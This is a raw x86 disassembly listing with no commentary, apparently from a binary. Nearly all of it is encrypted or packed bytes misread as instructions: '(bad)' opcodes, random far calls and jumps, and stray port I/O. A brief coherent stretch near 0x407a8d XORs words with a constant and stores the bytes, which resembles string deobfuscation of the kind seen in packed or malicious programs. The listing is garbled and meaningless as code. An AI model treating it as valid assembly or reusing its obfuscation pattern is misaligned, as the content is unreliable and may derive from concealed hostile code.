  407928:	int    0xad
  40792a:	call   0xb97d:0xcb58789a
  407931:	out    0xa6,eax
  407933:	add    edx,eax
  407935:	xchg   edx,eax
  407936:	sbb    edx,edi
  407938:	loope  0x407930
  40793a:	rcl    dl,1
  40793c:	lods   eax,DWORD PTR ds:[esi]
  40793d:	loopne 0x40796a
  40793f:	mov    ah,0xd2
  407941:	inc    ebx
  407942:	rcr    BYTE PTR [ecx-0x21],1
  407945:	test   BYTE PTR [ebp+0x1d],cl
  407948:	imul   ebp,DWORD PTR [edx+0x3bc90a6d],0xffffffb5
  40794f:	xor    DWORD PTR [ebx],edx
  407951:	sar    BYTE PTR [ecx+0x7c],1
  407954:	add    BYTE PTR [esi],dh
  407956:	pushf  
  407957:	(bad)  [eax-0x71]
  40795a:	xchg   esp,eax
  40795b:	adc    bh,bh
  40795d:	adc    eax,0x2993da3c
  407962:	and    ah,BYTE PTR [ebx+0x7e9a6b31]
  407968:	addr16 cmp al,0xbc
  40796b:	cwde   
  40796c:	pushf  
  40796d:	push   eax
  40796e:	ret    
  40796f:	pop    edi
  407970:	inc    edx
  407971:	mov    eax,0x883c4873
  407976:	inc    eax
  407977:	mov    ah,0x73
  407979:	sbb    eax,edi
  40797b:	rcr    BYTE PTR [eax],cl
  40797d:	retf   
  40797e:	idiv   DWORD PTR [eax+0x5d]
  407981:	adc    DWORD PTR [esi],edi
  407983:	mov    edi,DWORD PTR [edx+edi*1+0x4d257ec8]
  40798a:	dec    edx
  40798b:	fadd   DWORD PTR ds:0xe422a000
  407991:	push   ebp
  407992:	xor    esi,DWORD PTR [esi]
  407994:	iret   
  407995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407996:	mov    esi,0x16ebec2e
  40799b:	jb     0x40798a
  40799d:	repnz inc ebp
  40799f:	add    al,0xed
  4079a1:	js     0x4079a2
  4079a3:	lods   eax,DWORD PTR ds:[esi]
  4079a4:	dec    eax
  4079a5:	push   ecx
  4079a6:	pop    ebp
  4079a7:	std    
  4079a8:	test   eax,ecx
  4079aa:	pmovmskb edi,mm2
  4079ad:	and    cl,BYTE PTR [ebx-0x6e81a6c0]
  4079b3:	fcomp  QWORD PTR [ecx-0x22]
  4079b6:	push   ebp
  4079b7:	push   ss
  4079b8:	and    eax,0x6b74486e
  4079bd:	loope  0x407966
  4079bf:	fnstcw WORD PTR [ebp+0x16164d6c]
  4079c5:	into   
  4079c6:	cmp    eax,0xae677b10
  4079cb:	ins    DWORD PTR es:[edi],dx
  4079cc:	jl     0x407967
  4079ce:	inc    edx
  4079cf:	add    ebx,ecx
  4079d1:	sub    eax,0x8d71fa57
  4079d6:	iret   
  4079d7:	stos   DWORD PTR es:[edi],eax
  4079d8:	push   0xc2276a5c
  4079dd:	aad    0x54
  4079df:	loopne 0x407a1b
  4079e1:	les    ecx,FWORD PTR [ebp-0x3543ce67]
  4079e7:	pop    ecx
  4079e8:	xchg   edx,eax
  4079e9:	mov    bh,0xe0
  4079eb:	sub    bh,bl
  4079ed:	cdq    
  4079ee:	dec    edx
  4079ef:	mov    eax,ds:0xb313978b
  4079f4:	leave  
  4079f5:	inc    esi
  4079f6:	test   DWORD PTR [edi+0x2d],edx
  4079f9:	dec    ebx
  4079fa:	(bad)  
  4079fb:	ror    BYTE PTR [ecx-0xd0b2fb4],cl
  407a01:	pusha  
  407a02:	imul   esi,DWORD PTR [edx-0x21],0xfffffffd
  407a06:	pop    edx
  407a07:	and    eax,0xdf69a60a
  407a0c:	ror    DWORD PTR [esp+edx*2],0x33
  407a10:	test   DWORD PTR [ecx+0x4d],esi
  407a13:	ficomp DWORD PTR [edx+0x2e3f0a80]
  407a19:	push   0xc9ddae7d
  407a1e:	loop   0x407a94
  407a20:	adc    eax,0x30445eee
  407a25:	mov    ebp,0x98ff5145
  407a2a:	and    esp,esp
  407a2c:	mov    eax,0xd3e054a7
  407a31:	aad    0xf1
  407a33:	test   eax,0xd30af59a
  407a38:	mov    ebp,0x71c7af7d
  407a3d:	mov    esi,0x53817b54
  407a42:	mov    ah,0x85
  407a44:	push   edx
  407a45:	repz mov ecx,0x4a492552
  407a4b:	ds ins BYTE PTR es:[edi],dx
  407a4d:	stos   DWORD PTR es:[edi],eax
  407a4e:	bound  esi,QWORD PTR [edx-0x729148d1]
  407a54:	fwait
  407a55:	inc    edx
  407a56:	in     eax,dx
  407a57:	call   0x6f07:0xe75a7589
  407a5e:	aaa    
  407a5f:	jge    0x407a63
  407a61:	repz vxorps ymm0,ymm7,YMMWORD PTR [ebx+ecx*8]
  407a67:	dec    ebx
  407a68:	jmp    0x5c32:0xa3b07161
  407a6f:	push   esi
  407a70:	scas   eax,DWORD PTR es:[edi]
  407a71:	or     DWORD PTR [ecx+0x4714463a],0xffffffa5
  407a78:	and    BYTE PTR [ebx-0x72],0x5a
  407a7c:	xchg   ecx,eax
  407a7d:	xchg   DWORD PTR [edx+eax*4],eax
  407a80:	xlat   BYTE PTR ds:[ebx]
  407a81:	push   esi
  407a82:	sti    
  407a83:	out    0xfe,eax
  407a85:	pop    ecx
  407a86:	push   0xfffffff2
  407a88:	cs out 0x86,eax
  407a8b:	(bad)  
  407a8d:	add    ax,di
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	and    eax,DWORD PTR [edi+0x30]
  407ac3:	xchg   DWORD PTR [ebx+ebx*8+0x7e647878],ebx
  407aca:	js     0x407b44
  407acc:	call   0xd5e2:0xf9dc0de4
  407ad3:	xor    cl,BYTE PTR [edi+0x42]
  407ad6:	xor    eax,0xd09465a8
  407adb:	xchg   ebp,eax
  407adc:	ds stc 
  407ade:	xor    ecx,DWORD PTR [esi+ebx*8]
  407ae1:	rol    bh,cl
  407ae3:	adc    al,0x90
  407ae5:	in     eax,dx
  407ae6:	repz aam 0x27
  407ae9:	in     al,dx
  407aea:	aas    
  407aeb:	push   es
  407aec:	iret   
  407aed:	push   ss
  407aee:	xor    eax,edi
  407af0:	enter  0xc53a,0x51
  407af4:	or     cl,dh
  407af6:	pop    ebx
  407af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407af8:	fwait
  407af9:	iret   
  407afa:	ror    BYTE PTR [esi-0x2478c6bf],cl
  407b00:	jecxz  0x407aa7
  407b02:	push   eax
  407b03:	and    eax,0x6cd71210
  407b08:	cwde   
  407b09:	jae    0x407ab0
  407b0b:	out    dx,eax
  407b0c:	repz adc ebx,eax
  407b0f:	xlat   BYTE PTR ds:[ebx]
  407b10:	pop    esi
  407b11:	retf   0xf1ad
  407b14:	mov    dh,0x7d
  407b16:	xchg   ecx,eax
  407b17:	outs   dx,BYTE PTR ds:[esi]
  407b18:	inc    esi
  407b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b1a:	rcl    BYTE PTR [ebx-0x666a6326],0x4d
  407b21:	add    ah,bl
  407b23:	nop
  407b24:	imul   edx,DWORD PTR [ecx],0xffffffa7
  407b27:	je     0x407b01
  407b29:	lea    eax,[ebx]
  407b2b:	rol    DWORD PTR [ecx+0x7ac7fb0b],1
  407b31:	jnp    0x407b26
  407b33:	jns    0x6edd431b
  407b39:	and    al,0xed
  407b3b:	fsub   DWORD PTR [edi-0x6a]
  407b3e:	lock cmp bl,BYTE PTR [edx-0x57]
  407b42:	lock popf 
  407b44:	fidiv  WORD PTR [esi-0x546df9de]
  407b4a:	(bad)  
  407b4b:	fmul   DWORD PTR [ecx]
  407b4d:	cs jl  0x407b65
  407b50:	push   ds
  407b51:	gs dec ebp
  407b53:	mov    ecx,0xb409693b
  407b58:	into   
  407b59:	mov    edi,0x5a9145db
  407b5e:	test   al,0x40
  407b60:	add    ebp,DWORD PTR [ecx-0x4]
  407b63:	pop    ecx
  407b64:	ins    DWORD PTR es:[edi],dx
  407b65:	idiv   BYTE PTR [edx]
  407b67:	dec    edx
  407b68:	nop
  407b69:	fistp  DWORD PTR [ebp+ebp*2+0x2229fc85]
  407b70:	scas   al,BYTE PTR es:[edi]
  407b71:	or     eax,0xb87be9e1
  407b76:	outs   dx,BYTE PTR ds:[esi]
  407b77:	or     al,0x83
  407b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b7a:	fcom   QWORD PTR [eax]
  407b7c:	xchg   al,ch
  407b7e:	in     al,dx
  407b7f:	stos   BYTE PTR es:[edi],al
  407b80:	mov    cl,0x3f
  407b82:	dec    ecx
  407b83:	push   cs
  407b84:	call   0xe62b020a
  407b89:	or     BYTE PTR [esi+0x76],bl
  407b8c:	jo     0x407b7c
  407b8e:	in     eax,dx
  407b8f:	call   0xd53a:0xd22dee83
  407b96:	adc    ch,BYTE PTR [ecx-0x13]
  407b99:	jns    0x407b87
  407b9b:	xchg   ebp,ecx
  407b9d:	imul   ebp,esp,0x55
  407ba0:	fldcw  WORD PTR [eax+eax*8+0x1e2df647]
  407ba7:	sub    BYTE PTR [edx+0x5dac7b0a],ch
  407bad:	push   0xe7ccace7
  407bb2:	cmp    edx,DWORD PTR [edi+0x268c8262]
  407bb8:	aam    0x1f
  407bba:	mov    edi,es
  407bbc:	les    ebx,FWORD PTR [esi]
  407bbe:	mov    fs,esi
  407bc0:	inc    ebp
  407bc1:	(bad)  
  407bc2:	mov    ah,0xa0
  407bc4:	inc    edx
  407bc5:	push   edx
  407bc6:	push   esp
  407bc7:	js     0x407bcd
  407bc9:	push   eax
  407bca:	sti    
  407bcb:	fiadd  WORD PTR [esi+0x64861110]
  407bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd2:	xor    BYTE PTR [eax],0xc0
  407bd5:	jp     0x407bc9
  407bd7:	adc    bh,dl
  407bd9:	sbb    bl,0xee
  407bdc:	loope  0x407c50
  407bde:	pop    es
  407bdf:	or     dh,bh
  407be1:	test   al,0x46
  407be3:	lods   eax,DWORD PTR ds:[esi]
  407be4:	bound  ecx,QWORD PTR [si]
  407be7:	adc    ecx,ebp
  407be9:	int3   
  407bea:	loopne 0x407b89
  407bec:	div    BYTE PTR [edx]
  407bee:	stos   DWORD PTR es:[edi],eax
  407bef:	mov    esp,0x405ab24
  407bf4:	nop
  407bf5:	inc    ecx
  407bf6:	push   esi
  407bf7:	jno    0x407c44
  407bf9:	cdq    
  407bfa:	rcr    ah,cl
  407bfc:	pop    ecx
  407bfd:	dec    ebp
  407bfe:	push   cs
  407bff:	cwde   
  407c00:	and    eax,0xd52662f6
  407c05:	ret    
  407c06:	or     DWORD PTR [esi],esi
  407c08:	mov    edi,0x6d8d4c4d
  407c0d:	int3   
  407c0e:	repz xchg ecx,eax
  407c10:	xor    ah,dh
  407c12:	stos   BYTE PTR es:[edi],al
  407c13:	call   0x7604:0x23a96e5e
  407c1a:	lods   eax,DWORD PTR ds:[esi]
  407c1b:	(bad)  
  407c1d:	or     dl,BYTE PTR [esi-0x54]
  407c20:	sub    dl,BYTE PTR [esi]
  407c22:	sar    cl,cl
  407c24:	push   edx
  407c25:	xchg   al,bh
  407c27:	aas    
  407c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c29:	(bad)  
  407c2a:	xor    al,0xaa
  407c2c:	cs mov ch,0xf2
  407c2f:	pop    esp
  407c30:	cwde   
  407c31:	push   edi
  407c32:	inc    ebx
  407c33:	stos   DWORD PTR es:[edi],eax
  407c34:	pop    ds
  407c35:	and    bl,BYTE PTR [ebx+0x27c83607]
  407c3b:	pop    ds
  407c3c:	sbb    edi,edx
  407c3e:	loopne 0x407c61
  407c40:	rcr    DWORD PTR [edx-0x6de00894],cl
  407c46:	jo     0x407c3a
  407c48:	js     0x407bd4
  407c4a:	scas   eax,DWORD PTR es:[edi]
  407c4b:	jecxz  0x407ca7
  407c4d:	and    eax,DWORD PTR [ebx+esi*2]
  407c50:	xor    ebx,DWORD PTR [ebx+0x470a7a80]
  407c56:	shl    esp,cl
  407c58:	pop    ecx
  407c59:	mov    DWORD PTR [edx],ebp
  407c5b:	or     esi,ecx
  407c5d:	push   cs
  407c5e:	rcr    BYTE PTR cs:[edi+0x769ab4d9],1
  407c65:	sbb    eax,0x55007df2
  407c6a:	pop    esi
  407c6b:	xchg   esi,eax
  407c6c:	push   edx
  407c6d:	mov    ah,0xc1
  407c6f:	dec    ebx
  407c70:	loop   0x407cc2
  407c72:	pop    ecx
  407c73:	xchg   esi,eax
  407c74:	cmp    edi,esi
  407c76:	sub    al,0xcb
  407c78:	jo     0x407caa
  407c7a:	sbb    edi,DWORD PTR [esi+0x5cd5fc4b]
  407c80:	jb     0x407c20
  407c82:	push   0xfffffffa
  407c84:	fs pop eax
  407c86:	and    edx,0x7f
  407c89:	push   ecx
  407c8a:	popf   
  407c8b:	pushf  
  407c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c8d:	cmp    ch,dh
  407c8f:	push   cs
  407c90:	mov    bh,0xcb
  407c92:	sub    al,0x49
  407c94:	and    bh,BYTE PTR [edx+eax*4+0x54effc5f]
  407c9b:	cmp    al,0x3b
  407c9d:	add    al,0xa
  407c9f:	mov    cs,WORD PTR [eax-0x190b744a]
  407ca5:	inc    ebx
  407ca6:	pop    ecx
  407ca7:	pushf  
  407ca8:	mov    edx,0xea0f1a4f
  407cad:	stc    
  407cae:	add    al,0x9
  407cb0:	loope  0x407c54
  407cb2:	sbb    al,0x7e
  407cb4:	inc    ebx
  407cb5:	sbb    eax,0x2c538389
  407cba:	mov    ah,0xb6
  407cbc:	dec    eax
  407cbd:	test   DWORD PTR [esi-0x175a8fca],ecx
  407cc3:	jl     0x407d15
  407cc5:	es cwde 
  407cc7:	fcom   QWORD PTR [ebx]
  407cc9:	ds xchg ah,dh
  407ccc:	inc    esi
  407ccd:	cmp    al,0x3c
  407ccf:	lods   eax,DWORD PTR ds:[esi]
  407cd0:	scas   eax,DWORD PTR es:[edi]
  407cd1:	pop    ss
  407cd2:	push   eax
  407cd3:	push   ebp
  407cd4:	into   
  407cd5:	out    dx,eax
  407cd6:	cs pop edi
  407cd8:	gs and al,0x51
  407cdb:	or     eax,0xfeedd919
  407ce0:	mov    ds:0xcd571e55,eax
  407ce5:	(bad)  
  407ce6:	mov    BYTE PTR [ecx-0x1dd5d288],bl
  407cec:	aam    0x50
  407cee:	sub    BYTE PTR [ebp+0x21],al
  407cf1:	in     eax,0x1c
  407cf3:	jg     0x407ce1
  407cf5:	popf   
  407cf6:	retf   
  407cf7:	lahf   
  407cf8:	jmp    0x7384:0xd393b47f
  407cff:	or     ebx,ebp
  407d01:	aas    
  407d02:	push   eax
  407d03:	cmp    bh,ah
  407d05:	pop    edi
  407d06:	xor    esi,DWORD PTR [eax-0x1c]
  407d09:	lock popa 
  407d0b:	cmp    al,0x7c
  407d0d:	ins    DWORD PTR es:[edi],dx
  407d0e:	repz adc BYTE PTR [edx-0x498f53bf],dl
  407d15:	scas   eax,DWORD PTR es:[edi]
  407d16:	aad    0xc3
  407d18:	xchg   ebp,eax
  407d19:	adc    DWORD PTR ds:0x6fd1a76c,ecx
  407d1f:	pop    esp
  407d20:	mov    al,ds:0x2c72077c
  407d25:	and    eax,0x61d42a12
  407d2a:	fwait
  407d2b:	imul   DWORD PTR [ebp+0x5cf4a21c]
  407d31:	inc    eax
  407d32:	cmp    dh,BYTE PTR [eax+0x689a85f1]
  407d38:	sar    BYTE PTR [ebp+0x44f4b488],0x14
  407d3f:	lods   eax,DWORD PTR ds:[esi]
  407d40:	mov    ah,0x3e
  407d42:	jmp    0xac4:0xa9bd327a
  407d49:	dec    ebx
  407d4a:	ins    BYTE PTR es:[edi],dx
  407d4b:	out    dx,al
  407d4c:	aam    0x94
  407d4e:	in     eax,dx
  407d4f:	sti    
  407d50:	or     al,0x14
  407d52:	xor    dh,dl
  407d54:	add    BYTE PTR [edx-0x30],ah
  407d57:	adc    edi,esp
  407d59:	std    
  407d5a:	cmp    al,0x11
  407d5c:	aaa    
  407d5d:	stc    
  407d5e:	(bad)  
  407d5f:	cmp    BYTE PTR [ebx-0x310e7f2d],0x58
  407d66:	ja     0x407d5e
  407d68:	je     0x407dd6
  407d6a:	add    DWORD PTR [edi],0x78
  407d6d:	imul   esp,ebp,0xffffffc9
  407d70:	adc    esi,edx
  407d72:	cld    
  407d73:	loopne 0x407d70
  407d75:	sbb    esi,DWORD PTR [ebx+0x224d31ba]
  407d7b:	cli    
  407d7c:	fcmove st,st(7)
  407d7e:	(bad)  
  407d7f:	loopne 0x407d2c
  407d81:	das    
  407d82:	mov    ebp,0x9e8b7749
  407d87:	add    esi,edx
  407d89:	dec    edi
  407d8a:	sahf   
  407d8b:	aam    0xc7
  407d8d:	mov    WORD PTR [edx],gs
  407d8f:	mov    BYTE PTR [eax],dh
  407d91:	out    0x4e,al
  407d93:	cs ins DWORD PTR es:[edi],dx
  407d95:	pop    esi
  407d96:	mov    ch,0xee
  407d98:	inc    esp
  407d99:	mov    al,0xe6
  407d9b:	addr16 cli 
  407d9d:	pop    ecx
  407d9e:	mov    bl,dl
  407da0:	and    DWORD PTR [edi],eax
  407da2:	fs cs pop ebp
  407da5:	mov    ebx,0x788605eb
  407daa:	jb     0x407d6b
  407dac:	xchg   ebp,eax
  407dad:	xor    al,0x1f
  407daf:	movlps xmm5,QWORD PTR [ecx]
  407db2:	rol    BYTE PTR [ebx],0xa4
  407db5:	nop
  407db6:	pavgb  mm7,QWORD PTR [ebx]
  407db9:	ror    BYTE PTR [edi],1
  407dbb:	test   DWORD PTR [edx+0x5ffffff9],esi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fcom   st(4)
  407dda:	fisub  WORD PTR [edi]
  407ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ddd:	mov    al,bl
  407ddf:	js     0x407e59
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407d7b
  407de6:	(bad)  
  407de7:	je     0x407e17
  407de9:	sbb    ecx,esp
  407deb:	iret   
  407dec:	push   edx
  407ded:	fcom   QWORD PTR [eax-0x34]
  407df0:	jae    0x407e6f
  407df2:	dec    eax
  407df3:	sub    DWORD PTR [ecx],0xead365c2
  407df9:	pop    ds
  407dfa:	xchg   esp,eax
  407dfb:	test   al,0xef
  407dfd:	leave  
  407dfe:	sbb    dl,BYTE PTR [edx]
  407e00:	xor    al,0x36
  407e02:	int    0x63
  407e04:	clc    
  407e05:	dec    esp
  407e06:	scas   eax,DWORD PTR es:[edi]
  407e07:	cs (bad) 
  407e09:	jg     0x407e51
  407e0b:	clc    
  407e0c:	fld    QWORD PTR [edx-0x27218b13]
  407e12:	mov    dl,0xeb
  407e14:	arpl   WORD PTR [edi-0x3e],dx
  407e17:	inc    ebx
  407e18:	or     BYTE PTR [edi+eiz*4-0x5ce3ce36],cl
  407e1f:	sbb    al,0x65
  407e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e22:	mov    dh,0xa9
  407e24:	push   edi
  407e25:	xchg   esp,eax
  407e26:	call   0x5040:0x6f17dd3d
  407e2d:	add    BYTE PTR [edx-0x64],al
  407e30:	test   BYTE PTR [ebx+esi*4-0x60],0xbb
  407e35:	lods   eax,DWORD PTR ds:[esi]
  407e36:	mov    ecx,0x755d1fd8
  407e3b:	or     BYTE PTR [ecx+edi*4],0xf2
  407e3f:	and    eax,0xe163c079
  407e44:	inc    edi
  407e45:	jmp    0xc4bb:0x3bf6906d
  407e4c:	fbld   TBYTE PTR [esp+esi*8]
  407e4f:	pushf  
  407e50:	(bad)  
  407e51:	jmp    0x1d371bd4
  407e56:	mov    ecx,0x4d407fdc
  407e5b:	jmp    0x6293f8c1
  407e60:	mov    ebp,0x7c67cf72
  407e65:	push   esi
  407e66:	je     0x407e9b
  407e68:	jmp    0x32bb58b2
  407e6d:	iret   
  407e6e:	js     0x407e7c
  407e70:	out    dx,al
  407e71:	jb     0x407e18
  407e73:	pusha  
  407e74:	outs   dx,BYTE PTR ds:[esi]
  407e75:	xor    cl,BYTE PTR [ecx]
  407e77:	loope  0x407e56
  407e79:	popf   
  407e7a:	jnp    0x407e4c
  407e7c:	inc    edx
  407e7d:	pop    ds
  407e7e:	or     BYTE PTR [edi],dh
  407e80:	loopne 0x407ef0
  407e82:	add    al,0x6d
  407e84:	sti    
  407e85:	dec    ebp
  407e86:	pop    ss
  407e87:	je     0x407eac
  407e89:	and    BYTE PTR [ecx+eiz*8],ah
  407e8c:	inc    ecx
  407e8d:	inc    ebp
  407e8e:	sub    eax,0x204009ad
  407e93:	push   ebp
  407e94:	sbb    edx,DWORD PTR [eax-0x72]
  407e97:	xchg   ebx,eax
  407e98:	or     eax,0xa932ce2
  407e9d:	ficomp DWORD PTR [ecx+ebp*2]
  407ea0:	inc    edi
  407ea1:	pop    edx
  407ea2:	add    edx,esp
  407ea4:	aaa    
  407ea5:	lock dec esi
  407ea7:	scas   al,BYTE PTR es:[edi]
  407ea8:	out    0x35,eax
  407eaa:	jmp    0x407f15
  407eac:	adc    al,0x46
  407eae:	or     eax,0xf2fe82a5
  407eb3:	inc    edi
  407eb4:	aad    0x3b
  407eb6:	shl    BYTE PTR [ecx],0x42
  407eb9:	test   bh,cl
  407ebb:	jns    0x407ed7
  407ebd:	stos   DWORD PTR es:[edi],eax
  407ebe:	push   esi
  407ebf:	pop    eax
  407ec0:	pop    edx
  407ec1:	cmp    BYTE PTR [edi],al
  407ec3:	mov    edx,0xc7e3aebf
  407ec8:	cmp    DWORD PTR [esi-0x206c5914],esp
  407ece:	cld    
  407ecf:	test   al,0x61
  407ed1:	call   0x33ea3269
  407ed6:	(bad)  [edx+esi*8]
  407ed9:	mov    ch,0xc4
  407edb:	mov    al,ds:0xd908b88a
  407ee0:	ss pop eax
  407ee2:	popa   
  407ee3:	sub    edx,eax
  407ee5:	cmp    BYTE PTR [esi+0x58],0x54
  407ee9:	xor    DWORD PTR [edi-0x7268faf0],0x7926dfd1
  407ef3:	and    bh,BYTE PTR [edi-0x5fe944aa]
  407ef9:	nop
  407efa:	mov    dh,0x90
  407efc:	xor    BYTE PTR [ebx+0x12],ch
  407eff:	pop    ebx
  407f00:	pop    ebp
  407f01:	(bad)  
  407f02:	push   ebp
  407f03:	stos   DWORD PTR es:[edi],eax
  407f04:	pop    es
  407f05:	and    al,dh
  407f07:	lds    ebx,FWORD PTR [edx-0x3464daa5]
  407f0d:	mov    ch,0x58
  407f0f:	(bad)  
  407f10:	fstp   DWORD PTR [edx-0x7f2ddd4]
  407f16:	test   DWORD PTR [ecx+0x46],eax
  407f19:	shr    BYTE PTR [ebx],cl
  407f1b:	or     esp,DWORD PTR [edx+eax*1+0x12a54808]
  407f22:	paddsb mm7,mm1
  407f25:	loopne 0x407f4b
  407f27:	popf   
  407f28:	cmp    al,0xc6
  407f2a:	lods   al,BYTE PTR ds:[esi]
  407f2b:	gs inc eax
  407f2d:	inc    esp
  407f2e:	in     al,0xb3
  407f30:	fs pop es
  407f32:	and    al,0xde
  407f34:	or     eax,0xecb5d42f
  407f39:	test   ebp,ecx
  407f3b:	sbb    cl,BYTE PTR [ecx]
  407f3d:	adc    dl,BYTE PTR [esp+ebx*8+0x3a]
  407f41:	pop    ecx
  407f42:	jle    0x407f8e
  407f44:	xchg   ebp,eax
  407f45:	(bad)  
  407f46:	test   eax,0xf91b273c
  407f4b:	xor    BYTE PTR [edi],bh
  407f4d:	pop    eax
  407f4e:	(bad)  
  407f4f:	pop    ebp
  407f50:	in     eax,dx
  407f51:	pop    ebp
  407f52:	cmc    
  407f53:	jb     0x407fc6
  407f55:	leave  
  407f56:	(bad)  [edx-0x3f]
  407f59:	pushf  
  407f5a:	sub    eax,0x3f38a9d6
  407f5f:	jne    0x407fc2
  407f61:	sub    eax,0x8eb6859c
  407f66:	ja     0x407fc7
  407f68:	stc    
  407f69:	xchg   al,al
  407f6b:	xor    eax,0xd7ccd4d3
  407f70:	jg     0x407f0c
  407f72:	int3   
  407f73:	into   
  407f74:	int3   
  407f75:	or     edi,DWORD PTR [esi]
  407f77:	imul   esi,eax,0xb734b20f
  407f7d:	dec    esi
  407f7e:	test   al,0xc5
  407f80:	scas   al,BYTE PTR es:[edi]
  407f81:	push   ds
  407f82:	lahf   
  407f83:	sbb    eax,esi
  407f85:	sbb    BYTE PTR [ebx-0x5d2614f5],ah
  407f8b:	push   ebx
  407f8c:	or     al,0x1b
  407f8e:	pop    esp
  407f8f:	aas    
  407f90:	or     al,0xb7
  407f92:	mov    dl,0xad
  407f94:	xchg   esi,eax
  407f95:	sar    DWORD PTR [ebp+0x4e],cl
  407f98:	and    ecx,esi
  407f9a:	xchg   edi,eax
  407f9b:	out    0xda,al
  407f9d:	jns    0x407fa5
  407f9f:	pop    edx
  407fa0:	sub    al,0x12
  407fa2:	adc    ah,BYTE PTR [esp+edx*2+0x10816c25]
  407fa9:	push   ebx
  407faa:	stos   BYTE PTR es:[edi],al
  407fab:	outs   dx,DWORD PTR ds:[esi]
  407fac:	add    ch,0xe8
  407faf:	adc    al,0x98
  407fb1:	or     BYTE PTR [edx-0x212b0901],al
  407fb7:	out    0x7d,eax
  407fb9:	or     BYTE PTR [edi-0x38f3e369],cl
  407fbf:	cld    
  407fc0:	pop    edi
  407fc1:	dec    ecx
  407fc2:	fisub  WORD PTR [esi]
  407fc4:	push   ebx
  407fc5:	dec    ebx
  407fc6:	leave  
  407fc7:	cmp    eax,0x67cdf587
  407fcc:	ins    BYTE PTR es:[edi],dx
  407fcd:	rep lods eax,DWORD PTR ds:[esi]
  407fcf:	pop    ebp
  407fd0:	mov    bl,0xff
  407fd2:	jo     0x407f8d
  407fd4:	mov    DWORD PTR [eax+0x7cb282f6],0x55c84031
  407fde:	out    0xea,eax
  407fe0:	out    dx,eax
  407fe1:	mov    edi,0x2fe40894
  407fe6:	lods   eax,DWORD PTR ds:[esi]
  407fe7:	adc    eax,0x6684b46
  407fec:	in     al,0xba
  407fee:	inc    esp
  407fef:	add    al,0xc0
  407ff1:	push   esp
  407ff2:	xchg   esp,eax
  407ff3:	inc    ecx
  407ff4:	jmp    0x408075
  407ff6:	out    0xb0,eax
  407ff8:	test   eax,0x3f3ed8e8
  407ffd:	and    al,BYTE PTR [ebp+0x2c]
  408000:	or     bh,dl
  408002:	(bad)  
  408004:	mov    dl,0xa9
  408006:	stos   BYTE PTR es:[edi],al
  408007:	into   
  408008:	out    0xa6,al
  40800a:	push   ds
  40800b:	lock lods eax,DWORD PTR ds:[esi]
  40800d:	inc    edi
  40800e:	lods   eax,DWORD PTR ds:[esi]
  40800f:	mov    esi,0xb263c5d6
  408014:	aas    
  408015:	lahf   
  408016:	mov    ah,0x43
  408018:	fidivr WORD PTR [ebx+0x38]
  40801b:	pop    ss
  40801c:	mov    bh,bl
  40801e:	pop    ss
  40801f:	inc    ebx
  408020:	fstp   DWORD PTR [ecx-0x8683f60]
  408026:	ss push ss
  408028:	adc    DWORD PTR [eax],0xf75f4a59
  40802e:	stc    
  40802f:	and    cl,BYTE PTR [edx+0x67bba62]
  408035:	push   ds
  408036:	pop    ebx
  408037:	fiadd  WORD PTR [ebx+0x6e3f606a]
  40803d:	mov    edx,0xd4abc17e
  408042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408043:	iretw  
  408045:	pop    edx
  408046:	(bad)  
  408047:	ja     0x40807c
  408049:	sbb    ebp,DWORD PTR [edx]
  40804b:	mov    ecx,0xe39aa645
  408050:	mov    DWORD PTR [ecx+0x57bc6764],ebx
  408056:	sub    ah,BYTE PTR [ebp-0x25]
  408059:	cmp    eax,0xf6732624
  40805e:	dec    ebx
  40805f:	in     eax,dx
  408060:	add    BYTE PTR ds:0xbcb3be8e,cl
  408066:	and    ch,BYTE PTR [ecx]
  408068:	test   BYTE PTR [edx],dl
  40806a:	pushf  
  40806b:	inc    ebp
  40806c:	dec    DWORD PTR [eax+0x5464a7d6]
  408072:	test   BYTE PTR [ebp-0x6e],0x8
  408076:	aad    0x59
  408078:	lea    ebp,[ebx]
  40807a:	test   DWORD PTR [ecx+0x5c7b96bd],0x6ac6997e
  408084:	jne    0x40800e
  408086:	out    0x2c,al
  408088:	pop    ebx
  408089:	jmp    0xe13d0275
  40808e:	mov    eax,ds:0x38a07ea3
  408093:	fimul  DWORD PTR [ebp-0xd6fb9b8]
  408099:	aaa    
  40809a:	(bad)  
  40809b:	push   ebp
  40809c:	lahf   
  40809d:	xchg   esi,eax
  40809e:	ror    al,0x7f
  4080a1:	hlt    
  4080a2:	dec    ecx
  4080a3:	(bad)  
  4080a4:	aas    
  4080a5:	push   edi
  4080a6:	loopne 0x408106
  4080a8:	mov    DWORD PTR [esi+ebx*8],eax
  4080ab:	hlt    
  4080ac:	xor    esp,DWORD PTR [eax]
  4080ae:	ins    BYTE PTR es:[edi],dx
  4080af:	mov    eax,0x630e6507
  4080b4:	enter  0xcac,0x5d
